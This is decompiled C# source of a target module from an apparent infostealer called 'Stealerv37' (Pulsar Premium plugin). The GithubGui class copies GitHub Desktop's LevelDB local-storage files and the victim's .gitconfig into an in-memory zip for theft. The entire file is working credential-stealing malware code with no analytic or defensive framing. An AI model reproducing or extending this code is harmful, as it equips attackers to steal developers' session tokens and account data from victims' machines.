// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.GithubGui
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

#nullable disable
namespace Intelix.Targets.Applications;

public class GithubGui : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\GitHub Desktop\\Local Storage\\leveldb\\";
    if (!Directory.Exists(path1))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = nameof (GithubGui);
    string[] allowedExtensions = new string[2]
    {
      ".log",
      ".ldb"
    };
    Parallel.ForEach<string>((IEnumerable<string>) Directory.GetFiles(path1), (Action<string>) (file =>
    {
      if (!((IEnumerable<string>) allowedExtensions).Contains<string>(Path.GetExtension(file)))
        return;
      string entryPath = "GithubGui\\leveldb\\" + Path.GetFileName(file);
      zip.AddFile(entryPath, File.ReadAllBytes(file));
      counterApplications.Files.Add($"{file} => {entryPath}");
    }));
    string path2 = $"C:\\Users\\{Environment.UserName}\\.gitconfig";
    if (File.Exists(path2))
    {
      string entryPath = "GithubGui\\.gitconfig";
      zip.AddFile(entryPath, File.ReadAllBytes(path2));
      counterApplications.Files.Add($"{path2} => {entryPath}");
    }
    if (counterApplications.Files.Count<string>() <= 0)
      return;
    counter.Applications.Add(counterApplications);
  }
}
